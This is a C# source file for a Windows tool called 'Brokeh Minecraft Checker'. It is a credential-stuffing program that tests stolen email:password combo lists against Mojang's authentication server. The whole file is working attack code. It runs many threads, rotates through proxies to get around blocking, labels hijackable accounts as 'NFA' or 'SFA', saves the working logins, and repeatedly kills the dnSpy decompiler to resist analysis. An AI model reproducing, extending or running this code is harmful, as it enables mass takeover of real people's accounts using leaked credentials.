using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Brokeh_Minecraft_Checker.Common;
using Newtonsoft.Json;
using xNet;
using HttpStatusCode = xNet.HttpStatusCode;

namespace Brokeh_Minecraft_Checker
{
    public partial class Form1 : Form
    {
        private static readonly List<AccountExtra> EnabledExtras = new List<AccountExtra>()
        {
            new OptifineCapeExtra()
        };

        public sealed override string Text
        {
            get => base.Text;
            set => base.Text = value;
        }

        private const string Version = "2.4.0";
        private const string AuthServerEndpoint = "https://authserver.mojang.com/authenticate";
        private const string Changelog = "Added dark theme and internal changes.";

        private readonly Random _random;
        private readonly List<Account> _resolvedAccounts;

        private BlockingCollection<AccountData> _queue;
        private int _countGood;
        private int _countError;
        private int _countBad;
        private int _countThreads;
        private int _countTested;
        private Task[] _tasks;
        private int _status; // 0 = STOPPED | 1 = RUNNING
        private List<AccountData> _accounts;
        private List<string> _proxies;
        private CancellationTokenSource _cancellationToken;
        private string _saveFile;

        public Form1()
        {
            _resolvedAccounts = new List<Account>();
            _random = new Random();

            Program.KillDnSpyProcessByName();
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var fileDialog = new OpenFileDialog
            {
                Title = "Select Combo List",
                Filter = "Combo | *.txt"
            };

            if (fileDialog.ShowDialog() != DialogResult.OK)
                return;

            try
            {
                _accounts = new List<AccountData>();
                int failed = 0;
                foreach (string line in File.ReadAllLines(fileDialog.FileName))
                {
                    string[] split = line.Split(':');
                    if (split.Length < 2)
                    {
                        failed++;
                        continue;
                    }

                    _accounts.Add(new AccountData(split[0], split[1]));
                }

                messageBox.AppendText(
                    $"INFO |\tLoaded {_accounts.Count} Account entries ({failed} failed) {Environment.NewLine}");

                Program.KillDnSpyProcessByName();
            }
            catch (Exception)
            {
                MessageBox.Show("Invalid combo list.\nCombo format is EMAIL:PASSWORD");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var fileDialog = new OpenFileDialog
            {
                Title = "Select Proxy List",
                Filter = "Proxy | *.txt"
            };

            if (fileDialog.ShowDialog() != DialogResult.OK)
                return;

            try
            {
                _proxies = new List<string>();
                _proxies.AddRange(File.ReadAllLines(fileDialog.FileName));
                messageBox.AppendText("INFO |\tLoaded " + _proxies.Count + " Proxy entries" + Environment.NewLine);
            }
            catch (Exception)
            {
                MessageBox.Show("Invalid proxy list list.\nProxy list format is IP:PORT");
            }
        }

        /// <summary>
        /// The terminator will kill all running tasks
        /// </summary>
        private void Terminator()
        {
            // Cancel all tasks
            _cancellationToken.Cancel();
        }

        /// <summary>
        /// The "Checker" method used to run in an async task
        /// which checks the queued accounts for valid credentials
        /// </summary>
        private void Checker()
        {
            Program.KillDnSpyProcessByName();

            // Select random proxy
            int indexProxy = _random.Next(0, _proxies.Count);
            string proxyAddress = _proxies[indexProxy];

            // Loop until the queue count hits 0
            while (_queue.Count > 0)
            {
                // Check if the task should be canceled
                if (_cancellationToken.IsCancellationRequested)
                {
                    return;
                }

                try
                {
                    Program.KillDnSpyProcessByName();

                    var accountData = _queue.Take();
                    using (var httpRequest = new HttpRequest())
                    {
                        try
                        {
                            // Parse proxy set Http or Socks5 according to the user input
                            httpRequest.Proxy = ProxyClient.Parse(
                                (https.Checked ? ProxyType.Http : ProxyType.Socks5),
                                proxyAddress);

                            // Prepare the payload of request
                            string payload = PrepareRequest(httpRequest, accountData);

                            // Get the response
                            var responseObj = httpRequest.Post(AuthServerEndpoint,
                                payload, "application/json");

                            // Get response body
                            string response = responseObj.ToString();

                            // Handle response
                            HandleResponse(response, accountData, ref proxyAddress);
                        }
                        catch (Exception e)
                        {
                            // Switching proxy
                            _proxies.Remove(proxyAddress);
                            proxyAddress = _proxies[_random.Next(0, _proxies.Count)];

                            // Requeue data
                            _queue.Add(accountData);

                            // Incrementing error counter
                            Interlocked.Increment(ref _countError);

                            Program.KillDnSpyProcessByName();

                            // Informing the user
                            messageBox.AppendText("INFO |\tRequest failed for " + accountData + " switching proxy"
                                                  + Environment.NewLine);
                        }
                    }
                }
                catch
                {
                    // Incrementing error counter
                    Interlocked.Increment(ref _countError);
                }

                // Incrementing tested counter
                Interlocked.Increment(ref _countTested);
            }
        }

        /// <summary>
        /// Checks if the response can be parsed and will increment error counters if the request fails
        /// </summary>
        /// <param name="response">The http response</param>
        /// <param name="accountData">The account data</param>
        /// <param name="proxyAddress">The address for the proxy</param>
        private void HandleResponse(string response, AccountData accountData, ref string proxyAddress)
        {
            // Check if username or password is invalid
            if (response.Contains("Invalid username or password."))
            {
                messageBox.AppendText("BAD  |\t" + accountData + Environment.NewLine);
                Interlocked.Increment(ref _countBad);
                return;
            }

            // Check if access token is available
            if (!response.Contains("accessToken"))
            {
                // Switching proxy
                _proxies.Remove(proxyAddress);
                proxyAddress = _proxies[_random.Next(1, _proxies.Count)];

                // Requeue data 
                _queue.Add(accountData);

                // Updating 
                Interlocked.Increment(ref _countError);

                // Inform user
                messageBox.AppendText($"INFO |\t{accountData} failed, switching proxy{Environment.NewLine}");
                return;
            }

            // Parse Response
            var account = ParseResponse(response, accountData);
            account.Proxy = proxyAddress;
            // Add parsed account to resolved accounts
            _resolvedAccounts.Add(account);

            // Incrementing the good counter
            Interlocked.Increment(ref _countGood);

            // Informing the user
            messageBox.AppendText("GOOD |\t" + account + Environment.NewLine);
        }

        /// <summary>
        /// Parses the response into an object format and looks fo extras
        /// </summary>
        /// <param name="response">The response to parse</param>
        /// <param name="accountData">The used account data</param>
        /// <returns>The parsed Account</returns>
        private Account ParseResponse(string response, AccountData accountData)
        {
            // Parse JSON Response
            var results = JsonConvert.DeserializeObject<dynamic>(response);

            // Get nick name from profiles
            string nick = results.availableProfiles[0].name;
            // Make new account instance
            var account = new Account(nick, accountData.Password);

            string accountType;
            try
            {
                // Check if the account is Not full access or semi access
                accountType = results.user.secured ? "NFA" : "SFA";
            }
            catch (Exception)
            {
                accountType = "None";
            }

            // Set account type
            account.Type = accountType;

            // Check enabled extras
            EnabledExtras.ForEach(extra =>
            {
                bool f = extra.CheckExtra(new HttpRequest(), account);
                if (f) account.Extras.Add(extra);
            });

            // Check if the file is not null
            if (_saveFile != null)
            {
                // Saving result in file
                Task.Run(async () => await AppendSaveFile(account));
            }

            return account;
        }

        /// <summary>
        /// Will append the selected file with the given account
        /// </summary>
        /// <param name="account">The account</param>
        /// <returns>Task</returns>
        private async Task AppendSaveFile(Account account)
        {
            using (var writer = File.AppendText(_saveFile))
            {
                await writer.WriteLineAsync(account.ToCsv());
                await writer.FlushAsync();
            }
        }

        /// <summary>
        /// Prepares the request
        /// </summary>
        /// <param name="request">The request object</param>
        /// <param name="accountData">The account credentials</param>
        /// <returns>The payload of the request</returns>
        private string PrepareRequest(HttpRequest request, AccountData accountData)
        {
            var cookies = new CookieDictionary();
            request.Cookies = cookies;
            request.IgnoreProtocolErrors = true;
            request.ConnectTimeout = Convert.ToInt32(timeoutValue.Value) * 1000;
            request.AllowAutoRedirect = true;
            request.KeepAlive = true;
            // request.Referer = "https://minecraft.net/pt-br/login/";
            // request.UserAgent = "Minecraft Launcher/2.0.1049 (061d773c8e) Windows (6.1; x86)";
            // request.AddHeader("Origin", "mojang://launcher");

            /*
             * {
             *     "agent": {
             *         "name": "Minecraft",
             *         "version": 1,
             *     },
             *     "username": "USERNAME",
             *     "password": "PASSWORD",
             *     "clientToken": "TOKEN",
             *     "requestUser": true
             * }
             */
            string payload = string.Concat(@"{ ""agent"":{ ""name"":""Minecraft"",""version"":1},""username"":""",
                accountData.Email, @""",""password"":""", accountData.Password, @""",""requestUser"":""true""}"
            );

            return payload;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (_status != 0)
            {
                MessageBox.Show("Checker already started");
                return;
            }

            if (_accounts == null)
            {
                MessageBox.Show("No accounts have been selected");
                return;
            }

            if (_proxies == null)
            {
                MessageBox.Show("No proxies have been selected");
                return;
            }

            if (_saveFile == null)
            {
                var result = MessageBox.Show(
                    "No Save File Selected, the results will not be saved. Should the programme continue",
                    "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
                if (result != DialogResult.Yes)
                    return;
            }


            pictureBox1.Visible = true;
            _status = 1;

            button1.Enabled = false;
            button2.Enabled = false;
            button3.Enabled = false;
            socks5.Enabled = false;
            https.Enabled = false;

            if (!_accounts.Any() || !_proxies.Any())
            {
                MessageBox.Show("Load Combo list and Proxy list!");
                return;
            }

            _countGood = 0;
            _countError = 0;
            _countTested = 0;
            _countBad = 0;

            _queue = new BlockingCollection<AccountData>();
            foreach (var account in _accounts)
            {
                _queue.Add(account);
            }

            StartThreads();
        }

        /// <summary>
        /// Starting the selected amount of threads and beginning to check
        /// </summary>
        private void StartThreads()
        {
            // Get the total number of threads
            int numberOfThreads = decimal.ToInt16(threadCount.Value);

            // Initialize or reinitialize the tasks array
            _tasks = new Task[numberOfThreads];

            _cancellationToken = new CancellationTokenSource();

            // Loop until number of threads is reached
            for (int j = 0; j < numberOfThreads; j++)
            {
                // Run a new task with the #Checker method 
                // and set the created task into the array using the current index.
                // The cancellation token will be set so the task can be stopped at any time
                _tasks[j] = Task.Run(Checker, _cancellationToken.Token);

                // Incrementing thread count
                _countThreads++;
            }

            // Make a new task for listening to the other threads
            Task.Run(async () =>
            {
                await Task.WhenAll(_tasks);
                Done();
                MessageBox.Show("Done!");
            });
        }

        private void Done()
        {
            // Terminate all tasks
            Terminator();

            // Enable UI Components
            button1.Enabled = true;
            button2.Enabled = true;
            button3.Enabled = true;
            socks5.Enabled = true;
            https.Enabled = true;

            // Disable picture box
            pictureBox1.Visible = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            label7.Text = "B R O K E H    M I N E C R A F T   C H E C K E R   " + Version;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            // Updating UI Text elements
            countErrorLabel.Text = _countError.ToString();
            countGoodsLabel.Text = _countGood.ToString();
            countsTestedsLabel.Text = _countTested.ToString();
            countBadLabel.Text = _countBad.ToString();
            threadsCountLabel.Text = _countThreads.ToString();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Done();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }


        private void saveButton_Click(object sender, EventArgs e)
        {
            SaveFileDialog fileDialog = new SaveFileDialog()
            {
                Filter = "Text Files (*.txt)|*.txt|CSV file (*.csv)|*.csv",
            };

            if (fileDialog.ShowDialog() != DialogResult.OK)
                return;

            if (!File.Exists(fileDialog.FileName))
            {
                using (var writer = File.CreateText(fileDialog.FileName))
                {
                    writer.WriteLine("email:password,proxy");
                    writer.Flush();
                    writer.Close();
                }
            }

            _saveFile = fileDialog.FileName;
        }

        private struct AccountData
        {
            public AccountData(string email, string password)
            {
                Email = email;
                Password = password;
            }

            public string Email { get; }
            public string Password { get; }

            public override string ToString()
            {
                return $"{Email}:{Password}";
            }
        }
    }
}